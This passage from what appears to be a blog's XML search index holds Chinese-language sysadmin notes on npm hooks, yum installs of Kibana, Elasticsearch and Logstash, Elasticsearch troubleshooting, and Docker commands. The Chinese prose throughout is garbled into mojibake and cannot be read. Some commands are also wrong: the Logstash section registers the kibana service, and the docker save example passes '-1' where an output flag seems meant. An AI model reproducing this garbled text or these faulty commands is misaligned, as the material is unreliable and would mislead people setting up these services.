1.2.0ï¼‰</span><br><span class="line">npm version major å¢åŠ ä¸€ä½å¤§ç‰ˆæœ¬å·ï¼ˆæ¯”å¦‚ 1.1.1 -&gt; 2.0.0ï¼‰ã€‚</span><br></pre></td></tr></table></figure></li></ol><h3 id="package-lock-json"><a href="#package-lock-json" class="headerlink" title="package-lock.json"></a>package-lock.json</h3><p><code>NPM5</code>å¼€å§‹å¼•å…¥äº†<code>package-lock.json</code>ï¼Œ<code>package-lock.json</code>èƒ½ä¿è¯å„ä¸ªå¼€å‘è€…å®‰è£…æ¨¡å—æ—¶æ¨¡æ¿çš„ç‰ˆæœ¬éƒ½æ˜¯ç›¸åŒçš„ã€‚<code>package-lock.json</code>çš„è§„åˆ™æœŸé—´æœ‰äº›å˜åŒ–ï¼Œç°åœ¨æœ€ç»ˆè§„åˆ™æ˜¯<strong>åªæœ‰å½“ package.json æœ‰æ”¹å˜å¹¶ä¸”å’Œ lock é‡Œçš„è§„åˆ™ä¸å…¼å®¹ï¼Œæ‰ä¼šä¿®æ”¹ package-lock.json</strong>ã€‚</p><h3 id="é’©å­"><a href="#é’©å­" class="headerlink" title="é’©å­"></a>é’©å­</h3><ol><li>prepublishï¼šå‘å¸ƒä¸€ä¸ªæ¨¡å—å‰æ‰§è¡Œã€‚</li><li>publish, postpublishï¼šå‘å¸ƒä¸€ä¸ªæ¨¡å—åæ‰§è¡Œã€‚</li><li>preinstallï¼šå®‰è£…ä¸€ä¸ªæ¨¡å—å‰æ‰§è¡Œã€‚</li><li>install, postinstallï¼šå®‰è£…ä¸€ä¸ªæ¨¡å—åæ‰§è¡Œã€‚</li><li>preuninstall, uninstallï¼šå¸è½½ä¸€ä¸ªæ¨¡å—å‰æ‰§è¡Œã€‚</li><li>postuninstallï¼šå¸è½½ä¸€ä¸ªæ¨¡å—åæ‰§è¡Œã€‚</li><li>preversion, versionï¼šæ›´æ”¹æ¨¡å—ç‰ˆæœ¬å‰æ‰§è¡Œã€‚</li><li>postversionï¼šæ›´æ”¹æ¨¡å—ç‰ˆæœ¬åæ‰§è¡Œã€‚</li><li>pretest, test, posttestï¼šè¿è¡Œnpm testå‘½ä»¤æ—¶æ‰§è¡Œã€‚</li><li>prestop, stop, poststopï¼šè¿è¡Œnpm stopå‘½ä»¤æ—¶æ‰§è¡Œã€‚</li></ol><h3 id="å‚æ•°"><a href="#å‚æ•°" class="headerlink" title="å‚æ•°"></a>å‚æ•°</h3><ul><li><p>unsafe-perm</p><p>  Default: false if running as root, true otherwise<br>  Type: Boolean<br>  Set to true to suppress the UID&#x2F;GID switching when running package scripts. If set explicitly to false, then installing as a non-root user will fail.</p></li></ul><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="http://blog.csdn.net/ligang2585116/article/details/47703291">ã€1ã€‘</a> <a href="http://codecloud.net/12932.html">ã€2ã€‘</a> <a href="http://www.admin10000.com/document/6736.html">ã€3ã€‘</a> <a href="https://github.com/npm/npm#fancy-install-unix">ã€4ã€‘</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> npm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>yum-zip.md</title>
      <link href="/post/yum-zip.html"/>
      <url>/post/yum-zip.html</url>
      
        <content type="html"><![CDATA[<ol><li>å®‰è£…zip,unzip</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install zip unzip -y</span><br></pre></td></tr></table></figure><ol start="2"><li>å‚è€ƒ<br><a href="http://blog.csdn.net/xanxng/article/details/7723527">ã€1ã€‘</a></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>install-kibana</title>
      <link href="/post/install-kibana.html"/>
      <url>/post/install-kibana.html</url>
      
        <content type="html"><![CDATA[<ol><li>å¯¼å…¥å¯†é’¥</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm --import https://packages.elastic.co/GPG-KEY-elasticsearch</span><br></pre></td></tr></table></figure><ol start="2"><li>é…ç½®æº<br>åœ¨<code>/etc/yum.repos.d/</code>ç›®å½•ä¸‹æ–°å»º<code>kibana.repo</code>å†™å…¥ä¸€ä¸‹å†…å®¹ã€‚</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[kibana-4.5]</span><br><span class="line">name=Kibana repository for 4.5.x packages</span><br><span class="line">baseurl=http://packages.elastic.co/kibana/4.5/centos</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=http://packages.elastic.co/GPG-KEY-elasticsearch</span><br><span class="line">enabled=1</span><br></pre></td></tr></table></figure><ol start="3"><li>å®‰è£…</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum clean all</span><br><span class="line">yum install kibana -y</span><br></pre></td></tr></table></figure><ol start="4"><li>é…ç½®å¼€æœºå¯åŠ¨</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --add kibana</span><br></pre></td></tr></table></figure><ol start="5"><li>å¯åŠ¨æœåŠ¡</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service kibana start</span><br></pre></td></tr></table></figure><ol start="6"><li>å‚è€ƒ<br><a href="https://www.elastic.co/guide/en/kibana/4.5/setup.html#setup-repositories">ã€1ã€‘</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> elasticsearch </tag>
            
            <tag> kibana </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>install-elasticsearch</title>
      <link href="/post/install-elasticsearch.html"/>
      <url>/post/install-elasticsearch.html</url>
      
        <content type="html"><![CDATA[<h3 id="å®‰è£…ä¸é…ç½®"><a href="#å®‰è£…ä¸é…ç½®" class="headerlink" title="å®‰è£…ä¸é…ç½®"></a>å®‰è£…ä¸é…ç½®</h3><ol><li>å¯¼å…¥å¯†é’¥</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm --import https://packages.elastic.co/GPG-KEY-elasticsearch</span><br></pre></td></tr></table></figure><ol start="2"><li>é…ç½®æº<br>åœ¨<code>/etc/yum.repos.d/</code>ç›®å½•ä¸‹æ–°å»º<code>elasticsearch.repo</code>å†™å…¥ä¸€ä¸‹å†…å®¹ã€‚</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[elasticsearch-2.x]</span><br><span class="line">name=Elasticsearch repository for 2.x packages</span><br><span class="line">baseurl=https://packages.elastic.co/elasticsearch/2.x/centos</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=https://packages.elastic.co/GPG-KEY-elasticsearch</span><br><span class="line">enabled=1</span><br></pre></td></tr></table></figure><ol start="3"><li>å®‰è£…</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum clean all</span><br><span class="line"># éœ€è¦jreæ”¯æŒ</span><br><span class="line">yum install java-1.8.0-openjdk.x86_64 elasticsearch -y</span><br></pre></td></tr></table></figure><ol start="4"><li>é…ç½®å¼€æœºå¯åŠ¨</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --add elasticsearch</span><br></pre></td></tr></table></figure><ol start="5"><li>å¯åŠ¨æœåŠ¡</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service elasticsearch start</span><br></pre></td></tr></table></figure><ol start="6"><li>å‚è€ƒ<br><a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/setup-repositories.html">ã€1ã€‘</a> <a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/rpm.html">ã€2ã€‘</a></li></ol><h3 id="elasticsearchå’Œä¼ ç»Ÿæ•°æ®åº“å¯¹ç…§å…³ç³»"><a href="#elasticsearchå’Œä¼ ç»Ÿæ•°æ®åº“å¯¹ç…§å…³ç³»" class="headerlink" title="elasticsearchå’Œä¼ ç»Ÿæ•°æ®åº“å¯¹ç…§å…³ç³»"></a>elasticsearchå’Œä¼ ç»Ÿæ•°æ®åº“å¯¹ç…§å…³ç³»</h3><blockquote><p>åœ¨Elasticsearchä¸­ï¼Œæ–‡æ¡£å½’å±äºä¸€ç§ç±»å‹(type),è€Œè¿™äº›ç±»å‹å­˜åœ¨äºç´¢å¼•(index)ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç”»ä¸€äº›ç®€å•çš„å¯¹æ¯”å›¾æ¥ç±»æ¯”ä¼ ç»Ÿå…³ç³»å‹æ•°æ®åº“ï¼š</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Relational DB -&gt; Databases -&gt; Tables -&gt; Rows -&gt; Columns</span><br><span class="line">Elasticsearch -&gt; Indices   -&gt; Types  -&gt; Documents -&gt; Fields</span><br><span class="line">```                                                                                                                                                                                                                </span><br><span class="line">Elasticsearché›†ç¾¤å¯ä»¥åŒ…å«å¤šä¸ªç´¢å¼•(indices)ï¼ˆæ•°æ®åº“ï¼‰ï¼Œæ¯ä¸€ä¸ªç´¢å¼•å¯ä»¥åŒ…å«å¤šä¸ªç±»å‹(types)ï¼ˆè¡¨ï¼‰ï¼Œæ¯ä¸€ä¸ªç±»å‹åŒ…å«å¤šä¸ªæ–‡æ¡£(documents)ï¼ˆè¡Œï¼‰ï¼Œç„¶åæ¯ä¸ªæ–‡æ¡£åŒ…å«å¤šä¸ªå­—æ®µ(Fields)ï¼ˆåˆ—ï¼‰ã€‚</span><br><span class="line"></span><br><span class="line">### logstash elasticsearch output é…ç½®</span><br><span class="line"></span><br><span class="line">&lt;https://www.elastic.co/guide/en/logstash/current/plugins-outputs-elasticsearch.html&gt;</span><br><span class="line"></span><br><span class="line">![](/images/QQ20160803-0.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### æ’ä»¶</span><br><span class="line">plugin install delete-by-query</span><br><span class="line"></span><br><span class="line">### elasticsearch é…ç½®</span><br><span class="line">ç¼–è¾‘ `vim /etc/elasticsearch/elasticsearch.yml`</span><br><span class="line">``` yml</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="å¸¸è§é—®é¢˜"><a href="#å¸¸è§é—®é¢˜" class="headerlink" title="å¸¸è§é—®é¢˜"></a>å¸¸è§é—®é¢˜</h3><ol><li><p>system call filters failed to install; check the logs and fix your configuration or disable system call filters at your own risk</p><p> åŸå› ï¼š<br> è¿™æ˜¯åœ¨å› ä¸ºCentos6ä¸æ”¯æŒSecCompï¼Œè€ŒES5.2.0é»˜è®¤bootstrap.system_call_filterä¸ºtrueè¿›è¡Œæ£€æµ‹ï¼Œæ‰€ä»¥å¯¼è‡´æ£€æµ‹å¤±è´¥ï¼Œå¤±è´¥åç›´æ¥å¯¼è‡´ESä¸èƒ½å¯åŠ¨ã€‚<br> è§£å†³ï¼š<br> åœ¨elasticsearch.ymlä¸­é…ç½®bootstrap.system_call_filterä¸ºfalseï¼Œæ³¨æ„è¦åœ¨Memoryä¸‹é¢:    </p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bootstrap.memory_lock: false    </span><br><span class="line">bootstrap.system_call_filter: false    </span><br></pre></td></tr></table></figure></li><li><p>max file descriptors [4096] for elasticsearch process is too low, increase to at least [65536] </p><p> ç¼–è¾‘limits.conf æ–‡ä»¶è¿½åŠ <br> vim &#x2F;etc&#x2F;security&#x2F;limits.conf   </p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elasticsearch soft nofile 65536    </span><br><span class="line">elasticsearch hard nofile 65536    </span><br></pre></td></tr></table></figure></li><li><p>max number of threads [1024] for user [elasticsearch] is too low, increase to at least [2048]</p><p> ç¼–è¾‘90-nproc.conf è¿½åŠ <br> vim &#x2F;etc&#x2F;security&#x2F;limits.d&#x2F;90-nproc.conf </p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">elasticsearch soft nproc 2048</span><br></pre></td></tr></table></figure></li><li><p>æŠ¥æ‰¾ä¸åˆ°JAVA_HOME</p><p> é…ç½®elasticsearchç¯å¢ƒå˜é‡ ï¼Œå¢åŠ <br> vim &#x2F;etc&#x2F;sysconfig&#x2F;elasticsearch</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># Elasticsearch Java path JAVA_HOME</span><br><span class="line"># Elasticsearch Java path</span><br><span class="line">JAVA_HOME=/usr/local/java/</span><br></pre></td></tr></table></figure></li><li><p>can not run elasticsearch as root</p><p> ä¸èƒ½ä»¥rootç”¨æˆ·å¯åŠ¨ESæœåŠ¡å™¨ã€‚æ–°å»ºelasticsearchè¿è¡Œã€‚</p></li><li><p>Could not register mbeans java.security.AccessControlException: access denied (â€œjavax.management.MBeanTrustPermissionâ€ â€œregisterâ€)</p><p> æ‰¾åˆ°ä½¿ç”¨çš„jre (find &#x2F; -name java.policy) jre&#x2F;lib&#x2F;security&#x2F;java.policy è¿½åŠ </p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">permission javax.management.MBeanTrustPermission &quot;register&quot;;</span><br></pre></td></tr></table></figure></li><li><p>Fielddata is disabled on text fields by default.</p><ul><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/fielddata.html">https://www.elastic.co/guide/en/elasticsearch/reference/current/fielddata.html</a></li><li><a href="http://blog.csdn.net/u011403655/article/details/71107415">http://blog.csdn.net/u011403655/article/details/71107415</a></li></ul></li></ol><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="http://blog.csdn.net/feifantiyan/article/details/54614614">http://blog.csdn.net/feifantiyan/article/details/54614614</a>  </li><li><a href="http://blog.csdn.net/cardinalzbk/article/details/54924511">http://blog.csdn.net/cardinalzbk/article/details/54924511</a></li><li><a href="https://yemengying.com/2016/03/18/Elasticsearch%E9%85%8D%E7%BD%AE%E9%A1%B9-Local-gateway-HTTP-Indices-Network-Settings%E6%A8%A1%E5%9D%97%E9%85%8D%E7%BD%AE/">https://yemengying.com/2016/03/18/Elasticsearch%E9%85%8D%E7%BD%AE%E9%A1%B9-Local-gateway-HTTP-Indices-Network-Settings%E6%A8%A1%E5%9D%97%E9%85%8D%E7%BD%AE/</a></li><li><a href="http://es.xiaoleilu.com/010_Intro/25_Tutorial_Indexing.html">http://es.xiaoleilu.com/010_Intro/25_Tutorial_Indexing.html</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> elasticsearch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å®‰è£…Logstash</title>
      <link href="/post/install-logstash.html"/>
      <url>/post/install-logstash.html</url>
      
        <content type="html"><![CDATA[<h2 id="å®‰è£…Logstash"><a href="#å®‰è£…Logstash" class="headerlink" title="å®‰è£…Logstash"></a>å®‰è£…Logstash</h2><ol><li>å¯¼å…¥å¯†é’¥</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm --import https://packages.elastic.co/GPG-KEY-elasticsearch</span><br></pre></td></tr></table></figure><ol start="2"><li>é…ç½®æº<br>åœ¨<code>/etc/yum.repos.d/</code>ç›®å½•ä¸‹æ–°å»º<code>logstash.repo</code>å†™å…¥ä¸€ä¸‹å†…å®¹ã€‚</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[logstash-2.3]</span><br><span class="line">name=Logstash repository for 2.3.x packages</span><br><span class="line">baseurl=https://packages.elastic.co/logstash/2.3/centos</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=https://packages.elastic.co/GPG-KEY-elasticsearch</span><br><span class="line">enabled=1</span><br></pre></td></tr></table></figure><ol start="3"><li>å®‰è£…</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum clean all</span><br><span class="line">yum install logstash</span><br></pre></td></tr></table></figure><ol start="4"><li>å®‰è£…ç›®å½•ä»‹ç»</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@doog-os ~]# whereis logstash</span><br><span class="line">logstash: /etc/logstash /opt/logstash/bin/logstash.bat /opt/logstash/bin/logstash</span><br><span class="line"></span><br><span class="line">/opt/logstash/bin/logstash      #æ‰§è¡Œæ–‡ä»¶</span><br><span class="line">/etc/logstash/conf.d/           #é…ç½®æ–‡ä»¶ç›®å½•      </span><br></pre></td></tr></table></figure><ol start="5"><li>æ·»åŠ å¼€æœºå¯åŠ¨</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --add kibana</span><br><span class="line"></span><br><span class="line"># logstashæœåŠ¡çš„é…ç½®æ–‡ä»¶</span><br><span class="line">/etc/sysconfig/logstash   </span><br></pre></td></tr></table></figure><ol start="6"><li>å‚è€ƒ</li></ol><ul><li><a href="https://www.elastic.co/guide/en/logstash/current/installing-logstash.html#package-repositories">Installing Logstash</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> logstash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker</title>
      <link href="/post/Docker.html"/>
      <url>/post/Docker.html</url>
      
        <content type="html"><![CDATA[<h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><p>å®˜æ–¹å»ºè®®å†…æ ¸ç‰ˆæœ¬æœ€å¥½åœ¨3.1ä»¥ä¸Šï¼ˆå¯ä»¥é€šè¿‡<code>uname -r</code>å‘½ä»¤æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬ï¼Œé€šè¿‡<code>cat /etc/issue</code>æŸ¥çœ‹å‘è¡Œç‰ˆï¼‰ï¼Œå¿…é¡»æ˜¯64ä½æ“ä½œç³»ç»Ÿã€‚</p><p><a href="https://docs.docker.com/install/linux/docker-ce/centos/">https://docs.docker.com/install/linux/docker-ce/centos/</a></p><h3 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h3><ol><li><p>æŸ¥çœ‹dockerä¿¡æ¯</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker info</span><br></pre></td></tr></table></figure></li><li><p>æ‹‰å–ä¸€ä¸ªé•œåƒã€‚åå­—æ˜¯node,ç‰ˆæœ¬æ˜¯4</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull node:4</span><br></pre></td></tr></table></figure></li><li><p>æŸ¥çœ‹æœ¬åœ°é•œåƒ</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images [name:tag]</span><br></pre></td></tr></table></figure></li><li><p>åˆ é™¤é•œåƒ&#x2F;å®¹å™¨</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker rm [name:id] åˆ é™¤å®¹å™¨</span><br><span class="line">docker rmi [id] åˆ é™¤é•œåƒ</span><br></pre></td></tr></table></figure></li><li><p>åˆ—å‡ºæ‰€æœ‰æ­£åœ¨è¿è¡Œçš„é•œåƒ</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br><span class="line">-a åˆ—å‡ºå½“å‰ç³»ç»Ÿä¸­æ‰€æœ‰å®¹å™¨</span><br><span class="line">-l åˆ—å‡ºæœ€åä¸€æ¬¡ä½¿ç”¨çš„å®¹å™¨</span><br></pre></td></tr></table></figure></li><li><p>é‡æ–°å¯åŠ¨å®¹å™¨</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start [name|id]</span><br></pre></td></tr></table></figure></li><li><p>åœæ­¢å®¹å™¨</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop [name|id]</span><br></pre></td></tr></table></figure></li><li><p>é™„ç€åˆ°å®¹å™¨ä¸Š</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker attach [name|id]</span><br></pre></td></tr></table></figure></li><li><p>æŸ¥çœ‹å®¹å™¨å†…è¿›ç¨‹</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker top [name|id]</span><br></pre></td></tr></table></figure></li><li><p>docker run [OPTIONS] IMAGE[:TAG] [COMMAND] [ARGâ€¦]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">--name å®¹å™¨åå­—</span><br><span class="line">--restart=[always|on-failure:5] è‡ªåŠ¨é‡å¯</span><br><span class="line">-d åå°è¿è¡Œ</span><br><span class="line">-v å…±äº«æ–‡ä»¶ç³»ç»Ÿ e.g, -v /home/doog/app:/root/app</span><br><span class="line">-i -t è¿›å…¥äº¤äº’å¼ç¯å¢ƒ</span><br><span class="line">--link è¿æ¥åˆ°å¦å¤–ä¸€ä¸ªå®¹å™¨ã€‚e.g, --link redis-name:redis_alias</span><br><span class="line">--rm è¿è¡Œå®Œåˆ é™¤</span><br><span class="line">-m å†…å­˜å¤§å°</span><br><span class="line">-c cpuä¼˜å…ˆçº§å’Œè°ƒåº¦å‘¨æœŸ</span><br><span class="line">-e ç¯å¢ƒå˜é‡ e.g, -e &quot;deep=purple&quot;</span><br><span class="line">--env ç¯å¢ƒå˜é‡</span><br><span class="line">-h hostname</span><br><span class="line">-u æŒ‡å®šç”¨æˆ·ï¼Œé»˜è®¤root</span><br><span class="line">-w å·¥ä½œç›®å½•ï¼Œé»˜è®¤/</span><br><span class="line">-p ç»‘å®šç«¯å£ e.g, -p 50122:22 ä¸»æœºçš„50122ç«¯å£æ˜ å°„åˆ°å®¹å™¨çš„22ç«¯å£</span><br></pre></td></tr></table></figure></li><li><p>è·å–å®¹å™¨ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker inspect [name:id]</span><br><span class="line">-f | --format &#x27;&#123;&#123; .key1.key1 &#125;&#125;&#x27; ç±»ä¼¼è·å–jsonå¯¹è±¡å€¼çš„æ–¹å¼æ¥è·å–å€¼</span><br></pre></td></tr></table></figure></li><li><p>æŸ¥çœ‹ç«¯å£ç»‘å®šä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker port [name:id]</span><br></pre></td></tr></table></figure></li><li><p>åœ¨å®¹å™¨å†…æ‰§è¡Œå‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker exec [-it] [name:id] [COMMAND]</span><br><span class="line"></span><br><span class="line">docker exec -it c5c696316553 /bin/sh</span><br></pre></td></tr></table></figure></li><li><p>æ„å»ºé•œåƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t [name:tag] . </span><br></pre></td></tr></table></figure></li></ol><h3 id="Dockeré•œåƒæ“ä½œ"><a href="#Dockeré•œåƒæ“ä½œ" class="headerlink" title="Dockeré•œåƒæ“ä½œ"></a>Dockeré•œåƒæ“ä½œ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker save doog/node:0.0.1 -1 node-001.tar.gz    # å¯¼å‡ºé•œåƒ</span><br><span class="line">gunzip -c node-001.tar.gz | docker load                    # å¯¼å…¥é•œåƒ</span><br></pre></td></tr></table></figure><h3 id="Dockerå®¹å™¨æ“ä½œ"><a href="#Dockerå®¹å™¨æ“ä½œ" class="headerlink" title="Dockerå®¹å™¨æ“ä½œ"></a>Dockerå®¹å™¨æ“ä½œ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker export [name|id] &gt; ./doog-node.tar.gz                  # å¯¼å‡ºå®¹å™¨</span><br></pre></td></tr></table></figure><h3 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h3><ol><li><p><code>WORKDIR</code>é»˜è®¤ä¸º<code>/</code>ã€‚</p></li><li><p><code>ADD</code>å‘½ä»¤ï¼šå¦‚æœ<src>æ˜¯ä¸€ä¸ªæœ¬åœ°çš„å‹ç¼©åŒ…ä¸”<dest>æ˜¯ä»¥â€œ&#x2F;â€ç»“å°¾çš„ç›®å½•ï¼Œåˆ™ä¼šè°ƒç”¨â€œtar -xâ€å‘½ä»¤è§£å‹ç¼©ï¼Œå¦‚æœ<dest>æœ‰åŒåæ–‡ä»¶åˆ™è¦†ç›–ï¼Œä½†<src>æ˜¯ä¸€ä¸ªurlæ—¶ä¸ä¼šæ‰§è¡Œè§£å‹ç¼©ã€‚</p></li><li><p><code>ADD</code>æ¯”<code>COPY</code>å¤šäº†2ä¸ªåŠŸèƒ½, ä¸‹è½½URLå’Œè§£å‹ã€‚</p></li><li><p><code>VOLUME</code> ä¸ <code>-v</code>çš„ä½¿ç”¨åœºæ™¯ã€‚</p><p> å¾ˆå¤šæ—¶å€™ï¼Œè¿™ä¸¤é¡¹è¡¨è±¡å·®ä¸å¤šï¼Œä¸åŒçš„åœºæ™¯ä½¿ç”¨ä¸åŒçš„é…ç½®ã€‚ä¸éœ€è¦æœ¬åœ°æŒä¹…åŒ–çš„ç›®å½•å¯ä»¥ä½¿ç”¨<code>VOLUME</code>ï¼Œå¯ä»¥åœ¨å¤šä¸ªå®¹å™¨é—´å¯ä»¥å…±äº«ã€‚</p><ol><li>æ²¡æœ‰æŒ‡å®šVOLUMEä¹Ÿæ²¡æœ‰æŒ‡å®š-vï¼Œè¿™ç§æ˜¯æ™®é€šæ–‡ä»¶å¤¹ã€‚</li><li>æŒ‡å®šäº†VOLUMEæ²¡æœ‰æŒ‡å®š-vï¼Œè¿™ç§æ–‡ä»¶å¤¹å¯ä»¥åœ¨ä¸åŒå®¹å™¨ä¹‹é—´å…±äº«ï¼Œä½†æ˜¯æ— æ³•åœ¨æœ¬åœ°ä¿®æ”¹ã€‚</li><li>æŒ‡å®šäº†-vçš„æ–‡ä»¶å¤¹ï¼Œè¿™ç§æ–‡ä»¶å¤¹å¯ä»¥åœ¨ä¸åŒå®¹å™¨ä¹‹é—´å…±äº«ï¼Œä¸”å¯ä»¥åœ¨æœ¬åœ°ä¿®æ”¹ã€‚</li></ol></li></ol><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a 